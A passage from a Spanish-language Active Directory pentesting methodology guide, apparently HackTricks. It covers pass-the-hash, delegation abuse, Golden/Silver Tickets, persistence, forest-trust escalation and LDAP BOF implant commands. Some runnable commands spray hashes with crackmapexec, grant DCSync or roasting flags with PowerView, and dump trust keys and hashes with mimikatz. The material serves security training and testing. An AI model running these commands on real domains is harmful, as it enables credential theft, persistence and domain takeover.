Con credenciales de dominio o una sesión de usuario, vuelve a revisar los [**ataques de relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) de NTLM: las técnicas de enumeración autenticada y coerción pueden revelar rutas de relay que no estaban disponibles durante el reconocimiento sin autenticación.

### Busca credenciales en recursos compartidos de equipos | Recursos compartidos SMB

Ahora que tienes algunas credenciales básicas, deberías comprobar si puedes **encontrar** **archivos interesantes compartidos dentro de AD**. Podrías hacerlo manualmente, pero es una tarea muy aburrida y repetitiva (y más aún si encuentras cientos de documentos que tienes que revisar).

[**Sigue este enlace para conocer las herramientas que podrías usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Robar credenciales NTLM

Si puedes **acceder a otros equipos o recursos compartidos**, podrías **colocar archivos** (como un archivo SCF) que, si alguien accede a ellos, **activen una autenticación NTLM contra ti**, para que puedas **robar** el **challenge NTLM** y crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitía que cualquier usuario autenticado **comprometiera el controlador de dominio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalada de privilegios en Active Directory CON credenciales/sesión privilegiadas

**Para las siguientes técnicas no basta con ser un usuario de dominio normal; necesitas privilegios o credenciales especiales para realizar estos ataques.**

### Extracción de hashes

Con suerte, has conseguido **comprometer alguna cuenta de administrador local** mediante [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), incluido el relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) o [escalar privilegios localmente](../windows-local-privilege-escalation/index.html).\
Entonces, es hora de volcar todos los hashes de la memoria y del equipo local.\
[**Lee esta página sobre las distintas formas de obtener los hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una vez que tengas el hash de un usuario**, puedes usarlo para **suplantar su identidad**.\
Necesitas usar alguna **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** puedes crear un nuevo **sessionlogon** e **inyectar** ese **hash** en **LSASS**, para que se use cuando se realice cualquier **autenticación NTLM**. Esto último es lo que hace mimikatz.\
[**Lee esta página para obtener más información.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque busca **usar el hash NTLM del usuario para solicitar tickets Kerberos**, como alternativa al método común Pass The Hash mediante el protocolo NTLM. Por lo tanto, puede ser especialmente **útil en redes donde el protocolo NTLM está deshabilitado** y solo se permite **Kerberos** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **roban un ticket de autenticación de un usuario** en lugar de su contraseña o sus valores hash. Luego usan este ticket robado para **suplantar al usuario** y obtener acceso no autorizado a recursos y servicios dentro de una red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Reutilización de credenciales

Si tienes el **hash** o la **contraseña** de un **administrado**r local, deberías intentar **iniciar sesión localmente** en otros **equipos** con esas credenciales.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Ten en cuenta que esto es bastante **ruidoso** y **LAPS** lo **mitigaría**.

### Abuso de MSSQL y enlaces de confianza

Si un usuario tiene privilegios para **acceder a instancias de MSSQL**, podría usarlos para **ejecutar comandos** en el host de MSSQL (si se ejecuta como SA), **robar** el **hash** NetNTLM o incluso realizar un **relay** **attack**.\
Si una instancia de MSSQL es de confianza para otra instancia mediante un enlace de base de datos, un usuario con privilegios sobre la base de datos enlazada podría **usar la relación de confianza para ejecutar consultas en la otra instancia**. Estas relaciones de confianza se pueden encadenar y, con el tiempo, podrían llegar a una base de datos mal configurada en la que el usuario pueda ejecutar comandos.\
**Los enlaces entre bases de datos funcionan incluso a través de relaciones de confianza entre bosques.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de inventario y despliegue de TI

Las suites de inventario y despliegue de terceros suelen ofrecer rutas potentes para obtener credenciales y ejecutar código. Consulta:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si encuentras algún objeto Computer con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tienes privilegios de dominio en el equipo, podrás volcar los TGT de la memoria de todos los usuarios que inicien sesión en él.\
Así que, si un **Domain Admin inicia sesión en el equipo**, podrás volcar su TGT e impersonarlo mediante [Pass the Ticket](pass-the-ticket.md).\
Gracias a constrained delegation, incluso podrías **comprometer automáticamente un Print Server** (con suerte, será un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un usuario o equipo tiene permitida la "Constrained Delegation", podrá **impersonar a cualquier usuario para acceder a determinados servicios de un equipo**.\
Por tanto, si **comprometes el hash** de ese usuario/equipo, podrás **impersonar a cualquier usuario** (incluso a Domain Admins) para acceder a determinados servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrained Delegation

Tener privilegios **WRITE** sobre un objeto de Active Directory de un equipo remoto permite obtener ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de permisos/ACL

El usuario comprometido podría tener **privilegios interesantes sobre algunos objetos del dominio** que podrían permitirte moverte lateralmente/**escalar** privilegios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso del servicio Printer Spooler

Detectar un **servicio Spool a la escucha** dentro del dominio puede permitir **obtener nuevas credenciales** y **escalar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sesiones de terceros

Si **otros usuarios** **acceden** al equipo **comprometido**, es posible **recopilar credenciales de la memoria** e incluso **inyectar beacons en sus procesos** para impersonarlos.\
Normalmente, los usuarios accederán al sistema mediante RDP. A continuación, se explica cómo realizar un par de ataques contra sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para administrar la **contraseña del Administrator local** en equipos unidos al dominio y garantiza que sea **aleatoria**, única y que se **cambie** con frecuencia. Estas contraseñas se almacenan en Active Directory y el acceso se controla mediante ACL para que solo puedan acceder los usuarios autorizados. Con permisos suficientes para acceder a estas contraseñas, es posible pivotar a otros equipos.


{{#ref}}
laps.md
{{#endref}}

### Robo de certificados

**Recopilar certificados** del equipo comprometido podría ser una forma de escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de plantillas de certificados

Si hay **plantillas vulnerables** configuradas, es posible abusar de ellas para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation con una cuenta con privilegios elevados

### Volcado de credenciales del dominio

Una vez que obtengas privilegios de **Domain Admin** o, mejor aún, de **Enterprise Admin**, podrás **volcar** la **base de datos del dominio**: _ntds.dit_.

[**Puedes encontrar más información sobre el ataque DCSync aquí**](dcsync.md).

[**Puedes encontrar más información sobre cómo robar el NTDS.dit aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Un archivo de copia de seguridad legible que contenga `ntds.dit` junto con el subárbol `SYSTEM` debe tratarse como material de directorio expuesto incluso antes de extraerlo. Que un hash de contraseña esté obsoleto no significa que otros atributos del objeto sean seguros: campos como `description` pueden contener credenciales o notas operativas. Primero inspecciona los nombres de los miembros del archivo y evita que el contenido de la base de datos extraída aparezca en la salida de enumeración habitual.

### Privesc como persistencia

Algunas de las técnicas comentadas anteriormente pueden utilizarse para la persistencia.\
Por ejemplo, podrías:

- Hacer que los usuarios sean vulnerables a [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Hacer que los usuarios sean vulnerables a [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Conceder privilegios de [**DCSync**](#dcsync) a un usuario

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

El **ataque Silver Ticket** crea un **ticket Ticket Granting Service (TGS) legítimo** para un servicio específico mediante el uso del **hash NTLM** (por ejemplo, el **hash de la cuenta del equipo**). Este método se emplea para **acceder a los privilegios del servicio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **ataque Golden Ticket** consiste en que un atacante obtiene acceso al **hash NTLM de la cuenta krbtgt** en un entorno de Active Directory (AD). Esta cuenta es especial porque se usa para firmar todos los **Ticket Granting Tickets (TGT)**, que son esenciales para autenticarse dentro de la red de AD.

Una vez que el atacante obtiene este hash, puede crear **TGT** para cualquier cuenta que elija (ataque Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Son como Golden Tickets falsificados de una manera que **elude los mecanismos de detección habituales de Golden Tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistencia de cuenta mediante certificados**

**Tener certificados de una cuenta o poder solicitarlos** es una muy buena forma de mantener la persistencia en la cuenta de un usuario (incluso si cambia la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistencia en el dominio mediante certificados**

**También es posible usar certificados para mantener la persistencia con privilegios elevados dentro del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupo AdminSDHolder

El objeto **AdminSDHolder** de Active Directory garantiza la seguridad de los **grupos privilegiados** (como Domain Admins y Enterprise Admins) aplicando una **Access Control List (ACL)** estándar a estos grupos para evitar cambios no autorizados. Sin embargo, esta función puede explotarse: si un atacante modifica la ACL de AdminSDHolder para otorgar acceso completo a un usuario normal, dicho usuario obtiene un amplio control sobre todos los grupos privilegiados. Por tanto, esta medida de seguridad, diseñada para proteger, puede resultar contraproducente y permitir accesos indebidos si no se supervisa de cerca.

[**Más información sobre el grupo AdminDSHolder aquí.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciales DSRM

En cada **Domain Controller (DC)** existe una cuenta de **administrador local**. Si se obtienen derechos de administrador en una máquina de este tipo, se puede extraer el hash del administrador local mediante **mimikatz**. Después, es necesario modificar el registro para **habilitar el uso de esta contraseña**, lo que permite el acceso remoto a la cuenta de administrador local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistencia mediante ACL

Se pueden **otorgar** algunos **permisos especiales** a un **usuario** sobre objetos específicos del dominio, lo que le permitirá **escalar privilegios en el futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Descriptores de seguridad

Los **descriptores de seguridad** se usan para **almacenar** los **permisos** que un **objeto** tiene **sobre** otro **objeto**. Si puedes hacer un **pequeño cambio** en el **descriptor de seguridad** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin necesidad de pertenecer a un grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Objetos dinámicos: anti-forensics / evasión

Abusa de la clase auxiliar `dynamicObject` para crear principales/GPO/registros DNS de corta duración con `entryTTL`/`msDS-Entry-Time-To-Die`; se eliminan automáticamente sin tombstones, borrando evidencias de LDAP y dejando SID huérfanos, referencias `gPLink` rotas o respuestas DNS en caché (por ejemplo, contaminación de ACE de AdminSDHolder o redirecciones maliciosas de `gPCFileSysPath`/DNS integrado en AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** en memoria para establecer una **contraseña universal**, que permite acceder a todas las cuentas del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### SSP personalizado

[Aprende qué es un SSP (Security Support Provider) aquí.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **texto claro** las **credenciales** que se usan para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en AD y lo usa para **insertar atributos** (SIDHistory, SPN...) en objetos especificados **sin** dejar **registros** de las **modificaciones**. Se necesitan privilegios de **DA** y estar dentro del **dominio raíz**.\
Ten en cuenta que, si usas datos incorrectos, aparecerán registros bastante feos.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistencia mediante LAPS

Anteriormente hablamos de cómo escalar privilegios si tienes **permisos suficientes para leer las contraseñas de LAPS**. Sin embargo, estas contraseñas también se pueden usar para **mantener la persistencia**.\
Consulta:


{{#ref}}
laps.md
{{#endref}}

## Escalada de privilegios en el bosque: relaciones de confianza entre dominios

Microsoft considera que el **bosque** es el límite de seguridad. Esto implica que **comprometer un solo dominio podría permitir comprometer todo el bosque**.<sup>[[1]](#references)</sup>

### Información básica

Una [**relación de confianza entre dominios**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite que un usuario de un **dominio** acceda a recursos de otro **dominio**. Básicamente, crea un vínculo entre los sistemas de autenticación de ambos dominios, lo que permite que las verificaciones de autenticación fluyan sin problemas. Cuando los dominios establecen una relación de confianza, intercambian y conservan **claves** específicas en sus **Domain Controllers (DC)**, que son fundamentales para la integridad de la relación.

En una situación habitual, si un usuario quiere acceder a un servicio de un **dominio de confianza**, primero debe solicitar un ticket especial, conocido como **TGT entre reinos**, al DC de su propio dominio. Este TGT se cifra con una **clave** compartida acordada por ambos dominios. Luego, el usuario presenta este TGT al **DC del dominio de confianza** para obtener un ticket de servicio (**TGS**). Si el DC del dominio de confianza valida correctamente el TGT entre reinos, emite un TGS que concede al usuario acceso al servicio.

**Pasos**:

1. Un **equipo cliente** del **Dominio 1** inicia el proceso usando su **hash NTLM** para solicitar un **Ticket Granting Ticket (TGT)** a su **Domain Controller (DC1)**.
2. DC1 emite un nuevo TGT si el cliente se autentica correctamente.
3. Luego, el cliente solicita a DC1 un **TGT entre reinos**, necesario para acceder a los recursos del **Dominio 2**.
4. El TGT entre reinos se cifra con una **clave de confianza** compartida por DC1 y DC2 como parte de la relación de confianza bidireccional entre los dominios.
5. El cliente lleva el TGT entre reinos al **Domain Controller del Dominio 2 (DC2)**.
6. DC2 verifica el TGT entre reinos usando la clave de confianza compartida y, si es válido, emite un **Ticket Granting Service (TGS)** para el servidor del Dominio 2 al que el cliente quiere acceder.
7. Por último, el cliente presenta este TGS al servidor, que está cifrado con el hash de la cuenta del servidor, para obtener acceso al servicio del Dominio 2.

### Diferentes relaciones de confianza

Es importante tener en cuenta que **una relación de confianza puede ser unidireccional o bidireccional**. En las relaciones bidireccionales, ambos dominios confían entre sí, pero en una relación **unidireccional**, uno de los dominios será el **dominio de confianza** y el otro, el **dominio que confía**. En este último caso, **solo podrás acceder a los recursos del dominio que confía desde el dominio de confianza**.

Si el Dominio A confía en el Dominio B, A es el dominio que confía y B es el dominio de confianza. Además, en el **Dominio A**, se trataría de una **relación de confianza saliente**; y en el **Dominio B**, de una **relación de confianza entrante**.

**Diferentes relaciones de confianza**

- **Relaciones de confianza padre-hijo**: Esta configuración es habitual dentro del mismo bosque, donde un dominio hijo tiene automáticamente una relación de confianza transitiva y bidireccional con su dominio padre. Básicamente, esto significa que las solicitudes de autenticación pueden fluir sin problemas entre el dominio padre y el hijo.
- **Relaciones de confianza de enlace cruzado**: También conocidas como "relaciones de confianza de acceso directo", se establecen entre dominios hijos para agilizar los procesos de referencia. En bosques complejos, las referencias de autenticación suelen tener que subir hasta la raíz del bosque y luego bajar al dominio de destino. Al crear enlaces cruzados, se acorta el recorrido, lo que resulta especialmente útil en entornos geográficamente dispersos.
- **Relaciones de confianza externas**: Se establecen entre dominios diferentes y no relacionados, y por naturaleza no son transitivas. Según la [documentación de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), las relaciones de confianza externas son útiles para acceder a recursos de un dominio fuera del bosque actual que no está conectado mediante una relación de confianza entre bosques. El filtrado de SID refuerza la seguridad en las relaciones de confianza externas.
- **Relaciones de confianza de raíz de árbol**: Se establecen automáticamente entre el dominio raíz del bosque y una nueva raíz de árbol agregada. Aunque no son habituales, estas relaciones son importantes para agregar nuevos árboles de dominio a un bosque, ya que permiten que tengan un nombre de dominio único y garantizan la transitividad bidireccional. Puedes encontrar más información en la [guía de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Relaciones de confianza entre bosques**: Este tipo de relación de confianza es bidireccional y transitiva entre dos dominios raíz de bosque, y también aplica el filtrado de SID para reforzar las medidas de seguridad.
- **Relaciones de confianza MIT**: Se establecen con dominios Kerberos que no son de Windows y que cumplen con [RFC4120](https://tools.ietf.org/html/rfc4120). Las relaciones MIT son algo más especializadas y se usan en entornos que requieren integración con sistemas basados en Kerberos fuera del ecosistema Windows.

#### Otras diferencias en las **relaciones de confianza**

- Una relación de confianza también puede ser **transitiva** (A confía en B, B confía en C, entonces A confía en C) o **no transitiva**.
- Una relación de confianza puede configurarse como **bidireccional** (ambos confían entre sí) o **unidireccional** (solo uno confía en el otro).

### Ruta de ataque

1. **Enumera** las relaciones de confianza
2. Comprueba si algún **principal de seguridad** (usuario/grupo/equipo) tiene **acceso** a recursos del **otro dominio**, quizá mediante entradas ACE o porque pertenece a grupos del otro dominio. Busca **relaciones entre dominios** (probablemente para eso se creó la relación de confianza).
   1. En este caso, kerberoast podría ser otra opción.
3. **Compromete** las **cuentas** que pueden pivotar entre dominios.

Los atacantes podrían acceder a recursos de otro dominio mediante tres mecanismos principales:

- **Pertenencia a grupos locales**: Los principales podrían agregarse a grupos locales de máquinas, como el grupo “Administrators” de un servidor, lo que les otorgaría un control significativo sobre esa máquina.
- **Pertenencia a grupos de dominios externos**: Los principales también pueden pertenecer a grupos del dominio externo. Sin embargo, la eficacia de este método depende de la naturaleza de la relación de confianza y del ámbito del grupo.
- **Access Control Lists (ACL)**: Los principales pueden especificarse en una **ACL**, en particular como entidades en **ACE** dentro de una **DACL**, lo que les proporciona acceso a recursos específicos. Para quienes quieran profundizar en el funcionamiento de las ACL, DACL y ACE, el whitepaper titulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” es un recurso invaluable.<sup>[[17]](#references)</sup>

### Buscar usuarios/grupos externos con permisos

Puedes consultar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar principales de seguridad externos en el dominio. Estos serán usuarios/grupos de **un dominio/bosque externo**.

Puedes comprobarlo en **Bloodhound** o usando powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Otras formas de enumerar las relaciones de confianza del dominio:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Hay **2 claves de confianza**, una para _Child --> Parent_ y otra para _Parent_ --> _Child_.\
> Puedes obtener la que usa el dominio actual con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escala a Enterprise admin en el dominio secundario o principal abusando de la confianza mediante SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Explotar Configuration NC con permisos de escritura

Comprender cómo se puede explotar Configuration Naming Context (NC) es crucial. Configuration NC sirve como repositorio central de datos de configuración en los entornos de Active Directory (AD) de un bosque. Estos datos se replican en todos los Domain Controller (DC) del bosque, y los DC con permisos de escritura mantienen una copia modificable de Configuration NC. Para explotar esto, es necesario tener **privilegios SYSTEM en un DC**, preferiblemente en un DC secundario.

**Vincular una GPO al sitio del DC raíz**

El contenedor Sites de Configuration NC incluye información sobre los sitios de todos los equipos unidos al dominio dentro del bosque de AD. Con privilegios SYSTEM en cualquier DC, los atacantes pueden vincular GPO a los sitios del DC raíz. Esta acción puede comprometer el dominio raíz al manipular las políticas aplicadas a estos sitios.

Para obtener información detallada, se puede consultar la investigación sobre [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Comprometer cualquier gMSA del bosque**

Un vector de ataque consiste en atacar gMSA con privilegios elevados dentro del dominio. La clave raíz KDS, esencial para calcular las contraseñas de los gMSA, se almacena en Configuration NC. Con privilegios SYSTEM en cualquier DC, es posible acceder a la clave raíz KDS y calcular las contraseñas de cualquier gMSA del bosque.

Puedes encontrar un análisis detallado e instrucciones paso a paso en:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementario a MSA delegadas (BadSuccessor – abuso de atributos de migración):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Investigación externa adicional: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Ataque de modificación del esquema**

Este método requiere paciencia: hay que esperar a que se creen nuevos objetos de AD con privilegios elevados. Con privilegios SYSTEM, un atacante puede modificar el esquema de AD para otorgar a cualquier usuario control total sobre todas las clases. Esto podría dar lugar a acceso y control no autorizados sobre los objetos de AD que se creen posteriormente.

Puedes encontrar más información sobre [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA a EA con ADCS ESC5**

La vulnerabilidad ADCS ESC5 permite tomar el control de objetos de Public Key Infrastructure (PKI) para crear una plantilla de certificado que permita autenticarse como cualquier usuario del bosque. Como los objetos PKI residen en Configuration NC, comprometer un DC secundario con permisos de escritura permite ejecutar ataques ESC5.

Puedes leer más detalles en [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> En entornos sin ADCS, el atacante puede configurar los componentes necesarios, como se explica en [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Dominio de bosque externo: unidireccional (entrante) o bidireccional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

En este escenario, **un dominio externo confía en tu dominio**, lo que te otorga **permisos indeterminados** sobre él. Tendrás que averiguar **qué acceso tienen los principales de tu dominio sobre el dominio externo** y luego intentar explotarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio de bosque externo - unidireccional (saliente)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

En este escenario, **tu dominio** está **confiando** algunos **privilegios** a un principal de **otro dominio**.

Sin embargo, cuando un dominio **es objeto de confianza** del dominio que confía, el dominio de confianza **crea un usuario** con un **nombre predecible** que usa como **contraseña la contraseña de confianza**. Esto significa que es posible **acceder a un usuario del dominio que confía para entrar en el dominio de confianza**, enumerarlo e intentar escalar más privilegios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el dominio de confianza es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** a la relación de confianza entre dominios (lo cual no es muy común).

Otra forma de comprometer el dominio de confianza es esperar en una máquina a la que **un usuario del dominio de confianza pueda acceder** para iniciar sesión mediante **RDP**. Entonces, el atacante podría inyectar código en el proceso de la sesión RDP y **acceder desde allí al dominio de origen de la víctima**.\
Además, si la **víctima montó su disco duro**, el atacante podría almacenar **backdoors** en la **carpeta de inicio del disco duro** desde el proceso de la sesión RDP. Esta técnica se llama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigación del abuso de relaciones de confianza entre dominios

### **Filtrado de SID:**

- El riesgo de ataques que aprovechan el atributo SID history a través de relaciones de confianza entre bosques se mitiga mediante el filtrado de SID, que está activado de forma predeterminada en todas las relaciones de confianza entre bosques. Esto se basa en la suposición de que las relaciones de confianza dentro de un bosque son seguras, ya que, según la postura de Microsoft, el límite de seguridad es el bosque y no el dominio.
- Sin embargo, hay un inconveniente: el filtrado de SID puede interrumpir aplicaciones y el acceso de los usuarios, lo que lleva a que a veces se desactive.

### **Autenticación selectiva:**

- Para las relaciones de confianza entre bosques, el uso de la autenticación selectiva garantiza que los usuarios de ambos bosques no se autentiquen automáticamente. En cambio, se requieren permisos explícitos para que los usuarios accedan a dominios y servidores dentro del dominio o bosque que confía.
- Es importante señalar que estas medidas no protegen frente a la explotación del contexto de nomenclatura de configuración (NC) con permisos de escritura ni frente a ataques a la cuenta de confianza.

[**Más información sobre las relaciones de confianza entre dominios en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuso de AD basado en LDAP desde implantes en el host

La [colección LDAP BOF](https://github.com/P0142/LDAP-Bof-Collection) vuelve a implementar primitivas LDAP al estilo de bloodyAD como Beacon Object Files x64 que se ejecutan íntegramente dentro de un implante en el host (p. ej., Adaptix C2). Los operadores compilan el paquete con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, cargan `ldap.axs` y luego ejecutan `ldap <subcommand>` desde el beacon. Todo el tráfico usa el contexto de seguridad del inicio de sesión actual mediante LDAP (389) con signing/sealing o LDAPS (636) con confianza automática en el certificado, por lo que no se necesitan proxies socks ni artefactos en disco.<sup>[[4]](#references)</sup>

### Enumeración LDAP desde el implante

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` y `get-groupmembers` resuelven nombres cortos/rutas OU en DN completos y vuelcan los objetos correspondientes.
- `get-object`, `get-attribute` y `get-domaininfo` obtienen atributos arbitrarios (incluidos descriptores de seguridad), además de los metadatos del bosque/dominio de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` y `get-rbcd` exponen candidatos a roasting, configuraciones de delegación y descriptores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directamente desde LDAP.
- `get-acl` y `get-writable --detailed` analizan la DACL para enumerar trustees, permisos (GenericAll/WriteDACL/WriteOwner/escritura de atributos) y herencia, proporcionando objetivos inmediatos para la escalada de privilegios mediante ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Primitivas de escritura LDAP para escalada y persistencia

- Los BOF de creación de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permiten al operador crear nuevos principales o cuentas de equipo donde existan permisos sobre la OU. `add-groupmember`, `set-password`, `add-attribute` y `set-attribute` permiten secuestrar directamente los objetivos cuando se encuentran permisos de escritura de propiedades.
- Los comandos centrados en ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` y `add-dcsync`, convierten WriteDACL/WriteOwner sobre cualquier objeto de AD en restablecimientos de contraseñas, control de pertenencia a grupos o privilegios de replicación DCSync, sin dejar artefactos de PowerShell/ADSI. Los comandos `remove-*` correspondientes eliminan las ACE inyectadas.

### Delegación, roasting y abuso de Kerberos

- `add-spn`/`set-spn` hacen que un usuario comprometido pueda ser objeto de Kerberoast al instante; `add-asreproastable` (modificación de UAC) lo marca para AS-REP roasting sin tocar la contraseña.
- Las macros de delegación (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) modifican `msDS-AllowedToDelegateTo`, los flags de UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` desde el beacon, habilitando rutas de ataque de delegación constrained/unconstrained/RBCD y eliminando la necesidad de PowerShell remoto o RSAT.

### Inyección de sidHistory, traslado de OU y configuración de la superficie de ataque

- `add-sidhistory` inyecta SID privilegiados en el historial SID de un principal controlado (consulta [SID-History Injection](sid-history-injection.md)), lo que proporciona herencia de acceso sigilosa completamente a través de LDAP/LDAPS.
- `move-object` cambia el DN/OU de equipos o usuarios, lo que permite al atacante trasladar activos a OU donde ya existen permisos delegados antes de abusar de `set-password`, `add-groupmember` o `add-spn`.
